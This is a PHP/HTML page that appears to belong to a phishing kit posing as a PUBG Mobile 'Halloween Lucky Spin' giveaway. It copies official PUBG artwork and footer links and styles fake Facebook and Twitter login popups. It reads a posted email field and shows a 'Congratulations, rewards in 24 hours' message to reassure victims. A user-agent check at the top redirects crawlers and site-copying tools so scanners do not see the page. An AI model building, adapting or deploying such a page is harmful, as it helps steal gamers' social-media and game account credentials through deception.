<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title data-lang="code50">PUBG MOBILE SPIN</title>
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <style>
   @font-face {
     font-family:halloween;
     src: url('css/hal.ttf') format("truetype");
      }
      @font-face {
     font-family:pubg;
     src: url('css/pubg.ttf') format("truetype");
      }
       body {
        margin:0;
        box-sizing:border-box;
       }
	   ::-webkit-scrollbar {
	   display: none;
	   }
       .wrap {
           width:100%;
           height:100%;
           background:red;
       }
       .wrap .bg {
           position:relative;
           width:100%;
           height:100%;
           background:url('https://www.pubgmobile.com/en/event/halloweeks2020/images/bg_01.jpg') no-repeat;
           background-size:cover;
       }
       .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:415px;
       }
       
       .bg .label {
           border-left:4px solid orange;
           border-right:4px solid orange;
           text-align:center;
           width:415px;
           background:url('https://www.pubgmobile.com/en/event/halloweeks2020/images/tab_on.png') no-repeat;
           background-size:cover;
           background-position:100% 90%;
           height:44px;
           line-height:44px;
           border-radius:4px;
           box-shadow:0 2px 1px black;
       }
       .label span:nth-child(1){
           font-family: 'halloween', sans-serif;
           color:orange;
           font-size:20px;
           font-weight:bold;
           text-shadow:0 0.5px 3px black;
       
       }
       .label span:nth-child(2){
           margin-top:2px;
           text-shadow:0 0.5px 3px black;
           margin-right:4px;
           width:90px;
           color:orange;
           border:2px solid white;
           float:right;
           font-family:'pubg';
           height:36px;
           line-height:36px;
           font-size:19px;
           font-weight:bold;
           border-radius:4px;
           padding-left:5px;
       }
       .label span:nth-child(2) i {
           margin-top:7px;
           font-size:20px;
       }
       .bg .box {
           width:100%;
           height:100%;
           background:url('https://www.pubgmobile.com/en/event/halloweeks2020/images/bg_06.jpg') no-repeat;
           background-size:cover;
           text-align:center;
           margin-top:-30px;
       }
       
       .box .spin {
           background:url('img/pe.png') no-repeat;
           background-size:cover;
           width:380px;
           margin-top:30px;
           text-align:center;
           height:380px;
       }
       .spin .img{
           border:2px solid white;
           width:60px;
           height:60px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:135px;
       }
       .spin .img:nth-child(2){
           position:relative;
           top:250px;
           left:70px;
           transform:rotate(179.5deg);
       }
       .spin .img:nth-child(3){
           position:relative;
           top:94px;
           right:-95px;
           transform:rotate(61deg);
       }
       .spin .img:nth-child(4){
           position:relative;
           top:195.5px;
           right:-27px;
           transform:rotate(119deg);
       }
       .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-230px;
           transform:rotate(241deg);
       }
       .spin .img:nth-child(6){
           position:relative;
           top:25px;
           left:-95px;
           transform:rotate(299deg);
       }
       .box .start {
           position:relative;
           border:none;
           bottom:380px;
           width:180px;
       }

       .mask {
           position:fixed;
           top:0;
           left:0;
           width:100%;
           height:100%;
           background:rgba(0,0,0,0.50);
       }
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:auto;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:da 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes da {
           from { transform:translate(-50%,-80%);}
           to { transform:translate(-50%,-50%);}
       }
       .alert .top {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alert p {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alert p i {
           font-size:40px;
       }
       .alert .btn {
           margin-top:4px;
           width:95px;
           height:30px;
           line-height:30px;
           font-weight:bold;
           font-size:16px;
           font-family:'pubg';
           background:orange;
           border-radius:5px;
       }
       .alertx {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:210px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:dax 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes dax {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertx .topx {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:20px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertx .px {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
      .alertx .px img {
           width:100px;
           height:100px;
       }
       .alertx .btnx {
           margin-top:4px;
           width:95px;
           height:30px;
           line-height:30px;
           font-weight:bold;
           font-size:16px;
           font-family:'pubg';
           background:orange;
           border-radius:5px;
       }
       /**/
       .alertl {
           display:none;
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
           animation:dal 2s forwards ;
           transition:ease-in-out;
       }
       @keyframes dal {
           from { transform:translate(-50%,-65%);}
           to { transform:translate(-50%,-50%);}
       }
       .alertl .topl {
           font-family: 'halloween', sans-serif;
           top:-42.5px;
           left:-2px;
           position:absolute;
           width:270px;
           height:40px;
           line-height:40px;
           font-size:15px;
           background:orange;
           border-top-left-radius:4px;
           border-top-right-radius:4px;
           border:2px solid orange;
           border-bottom:none;
       }
       .alertl .pl {
           font-family:'pubg';
           color:orange;
           font-weight:bold;
           font-size:15px;
           padding:10px 10px 10px 10px;
       }
       .alertl .fb {
           height:32px;
           line-height:32px;
           width:250px;
           background:#3b5998;
           font-size:17px;
           padding-left:10px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:15%;
           font-family:'pubg';
           text-align:center;
       }
       .alertl .tw {
           padding-left:10px;
           height:32px;
           line-height:32px;
           width:250px;
           background:#1DA1F2;
           font-size:17px;
           border-radius:4px;
           box-shadow:0 3px 1px orange;
           color:white;
           font-weight:bold;
           margin-top:5%;
           font-family:'pubg';
           text-align:center;
       }
       .fb i , .tw i {
           margin-top:8px;
           float:left;
       }
             @media only screen and (min-width:100px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:150px;
       }
      }
       @media only screen and (min-width:200px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:370px;;
       }
       .bg .label {
           border:none;
           width:370px;
       }
       .bg .box {
           width:370px;
           height:380px;
       }
       .img {
           position:absolute;
           width:10px;
       }
       .box .spin {
           background:url('img/spin.png') no-repeat;
           background-size:cover;
           width:350px;
           text-align:center;
           height:350px;
       }
       .box .start {
           position:relative;
           border:none;
           bottom:334px;
           width:170px;
       }
        .spin .img:nth-child(2){
           position:relative;
           top:250px;
           left:65px;
           transform:rotate(179.5deg);
       }
       }
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border:none;
           margin-top:-3px;
           width:410px;
       }
       .bg .box {
           width:410px;
           height:460px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:130px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-225px;
           transform:rotate(241deg);
       }
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
       }
       }
       #da {
           display:none;
       }
       .preload { 
         background:black;
         z-index:999;
         width:100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         display:flex;
         align-items:center;
         justify-content:center;
        }
        .preload h1 {
            font-family:'halloween';
            font-size:5em;
            color:orange;
        }
        .navbar-fb {
	background: #3b5998;
	height: auto;
	width:314px;
	padding: 8px;
	border-top-left-radius: 10px;
	border-top-right-radius: 10px;
}
.navbar-fb img {
    width: 115PX;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb {
    width: 300px;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.content-box-fb img {
    width: 60;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    border-radius: 12px;
    display: block;
}
.txt-login-fb {
    width: 270px;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 17px;
    padding: 8px;
    color: #90949c;
    font-size: 16px;
    font-family: Roboto;
    text-align: center;
    display: block;
}
.login-form input[type="text"],.login-form input[type="password"] {
	width: 275px;
	height: auto;
	padding: 12px;
	color: #000;
	font-size: 14px;
	font-weight: 400;
	font-family: 'Lato',sans-serif;
	border: 1px solid #bdbebf;
	cursor: pointer;
	outline: none;
}
.login-form input[type="text"] {
    margin: 0;
    padding-bottom: 13px;
	border-bottom: none;
	border-radius: 4px 4px 0 0;
	box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
}
.login-form input[type="password"] {
    margin: 0;
	border-top: none;
	border-radius: 0 0 4px 4px;
	box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
}
.btn-login-fb {
	background: #1778f2;
	width: 275px;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: Roboto;
	font-weight: bold;
	text-align: center;
	text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
	border: 1px solid #3578e5;
	border-radius: 5px;
	box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
	outline: none;
	display: block;
}
.txt-create-account {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-not-now {
    width: 100%;
    height: auto;
    padding: 5px;
    color: #3b5998;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.txt-forgotten-password {
    width: 100%;
    height: auto;
    margin-bottom: 30px;
    padding: 5px;
    color: #7596c8;
    font-size: 13.5px;
    font-family: Roboto;
    text-align: center;
}
.language-box {
    width: 100%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.language-name {
    width: 40%;
    height: auto;
    margin: 5px;
    margin-bottom: 0px;
    color: #3b5998;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: inline-block;
}
.language-name i {
    width: 23px;
    padding: 4px;
    color: #90949c;
    border: 1px solid #3b5998;
    border-radius: 3px;
}
.language-name-active {
    color: #90949c;
    font-weight: bold;
}
.copyright {
    width: 40%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    color: #90949c;
    font-size: 12px;
    font-family: Roboto;
    text-align: center;
    display: block;
}

   .header-twitter {
    background: #fff;
    width: 100%;
    font-size: 25px;
    font-weight: bold;
    text-align: left;
    position: relative;
    border-radius: 10px;
}
.header-twitter img {
    width: 55;
}
.box-twitter {
    width: 100%;
    height: 400px;
    position: absolute;
    overflow: none;
    font-size: 15px;
    font-family: sans-serif;
    border-radius: 10px;
}
.txt-login-twitter {
    color: #000;
    font-size: 20px;
    font-weight: bold;
    font-family: arial, sans-serif;
    margin-top: 3%;
    margin-bottom: 5%;
}
.input-box-twitter {
    background: #f5f8fa;
	width: 90%;
	height: 55px;
	margin-top: 10px;
	margin-bottom: 18px;
	padding: 10px;
	padding-top: 5px;
	font-size: 14px;
	font-family: arial, sans-serif;
	text-align: left;
	position: relative;
	border-bottom: 2px solid #657786;
	border-radius: 2px;
	outline: none;
	z-index: 2;
}
.input-box-twitter label {
    color: #657786;
	text-align: left;
}
.input-box-twitter input {
	background: transparent;
	width: 100%;
	height: auto;
	padding: 7px;
	padding-top: 3px;
	padding-left: 0px;
	color: #000;
	font-size: 18px;
	font-family: arial, sans-serif;
	text-align: left;
	position: relative;
	border: none;
	outline: none;
	z-index: 2;
}
.btn-login-twitter {
    background: #1da1f2;
    width: 90%;
    height: auto;
    padding: 14px;
    color: #fff;
    font-size: 15px;
    font-weight: bold;
    font-family: arial, sans-serif;
    border: none;
    border-radius: 30px;
    outline: none;
    letter-spacing: 1;
}
.footer-menu-twitter {
    width: auto;
    height: auto;
    margin: 0.5%;
    margin-top: 7%;
    color: #1da1f2;
    font-size: 14px;
    font-family: arial, sans-serif;
    display: inline-block;
}
.bulet {
    color: #000;
    font-size: 8px;
}
.aktifnya {
    color: #1da1f2;
    border-bottom: 2px solid #1da1f2;
}
          .popup-login {
	background:rgba(0,0,0,0.5);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:350px;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
@media only screen and (max-width:600px) {
	.popup-box-login-fb {
		margin-top: 4%;
	}
}
       @media only screen and (min-width:399px) {
          .bg img {
           border-top-left-radius:5px;
           border-top-right-radius:5px;
           width:410px;
       }
         .bg .label {
           border-radius:0;
           margin-top:0;
           width:410px;
       }
       .bg .box {
           border-radius:0;
           width:410px;
           height:460px;
       }
       .spin .img:nth-child(1){
           position:relative;
           top:35px;
           left:130px;
       }
        .spin .img:nth-child(5){
           position:relative;
           top:195.5px;
           left:-225px;
           transform:rotate(241deg);
       }
       .alert {
           position:absolute;
           top:50%;
           left:50%;
           background:url('https://cdn.hipwallpaper.com/m/93/80/sc2eVj.jpg') no-repeat;
           background-size:cover;
           width:270px;
           height:170px;
           border-bottom-left-radius:4px;
           border-bottom-right-radius:4px;
           border:2px solid orange;
           border-top:none;
       }
       .footer-menu-twitter {
           margin-top:-30px;
       }
       }
   </style>
   </head>

<body>
<center>
        <div class="wrap">
        <div class="bg">
            <img src="img/banner.jpg">
            <div class="label">
                <span>HALLOWEEN LUCKY SPIN</span>
                <span id="waktu"><i style="float:left;" class="fa fa-clock-o" aria-hidden="true"></i><p></p></span>
            </div>
            <div class="box">
                <center><div class="spin">
                    <img class="img" src="img/1.png">
                     <img class="img" src="img/2.png">
                      <img class="img" src="img/3.png">
                       <img class="img" src="img/4.png">
                        <img class="img" src="img/5.png">
                         <img class="img" src="img/6.png">
                </div>
                </center>
                <img onclick="spin()" class="start" src="img/putar.png">
                <img id="hal" style="display:none;" width="100" src="http://assets.stickpng.com/images/580b57fcd9996e24bc43c402.png">
            </div>
        </div>
    </div>
    
    
    
    
    <div class="mask"></div>
        <div class="alert">
            <div class="top">CONGRATULATIONS</div>
            <p>Hi Survivor, your account has been processing to receive your selected rewards
			<br>
			<br>
			Please wait up to 24 hours to receive this rewards in your ingame mailbox
			<br>
			<br>
            <i class="fa fa-gift" aria-hidden="true"></i></p>
            <div class="btn" onclick="location.href='https://pubgmobile.com/';">Logout</div>
			<br>
			<br>
        </div>
    
    
    
    
    
    <link rel="stylesheet" href="https://www.pubgmobile.com/common/css/footer.css">
<div class="footer">
    <div class="foot_ct">
        <p class="foot_icon">
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_facebook'});" href="https://www.facebook.com/PUBGMobile" class="foot_icon1" target="_blank">Facebook</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_twitter'});" href="https://twitter.com/PUBGMOBILE" class="foot_icon2" target="_blank">Twitter</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_youtube'});" href="https://www.youtube.com/pubgmobile" class="foot_icon3" target="_blank">Youtube</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_ins'});" href="https://www.instagram.com/pubgmobile" class="foot_icon4" target="_blank">Instagram</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_vk'});" href="https://vk.com/pubgmobile" class="foot_icon5" target="_blank">VK</a>
        </p>
    </div>
</div>


</center>
<script>
   function hide(){
    $('.mask').hide();
    $('.alert').hide();
   }
   function claim() {
       $('.alertx').hide();
       $('.mask').show();
       $('.alertl').show();
   }
   function fb() {
       $('.alertl').hide();
       $('.login-facebook').show();
   }
   function tw() {
       $('.alertl').hide();
       $('.login-twitter').show();
   }
    function spin() {
     document.getElementsByTagName("audio")[0].play();
    setTimeout(function() {
    $('.alertx').show();
    $('.mask').show();
   },3900);

  var $myElm = $(".spin");

  function rotate(degrees) {
    $myElm.css({
      '-webkit-transform': 'rotate(' + degrees + 'deg)',
      '-moz-transform': 'rotate(' + degrees + 'deg)',
      '-ms-transform': 'rotate(' + degrees + 'deg)',
      'transform': 'rotate(' + degrees + 'deg)'
    });
  }
 $({
    deg: 0
  }).animate({
    deg: 360 * 40
  }, {
    duration: 3900,
    step: function() {
        const lord = Math.random() * (360 - 1) + 1;
      var deg = this.deg;
      rotate(lord * 4);
    }
  });
}
setInterval(function time(){
  var d = new Date();
  var hours = 24 - d.getHours();
  var min = 60 - d.getMinutes();
  if((min + '').length == 1){
    min = '0' + min;
  }
  var sec = 60 - d.getSeconds();
  if((sec + '').length == 1){
        sec = '0' + sec;
  }
  jQuery('#waktu p').html(hours+':'+min+':'+sec)
}, 1000);
</script>
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>

</body></html>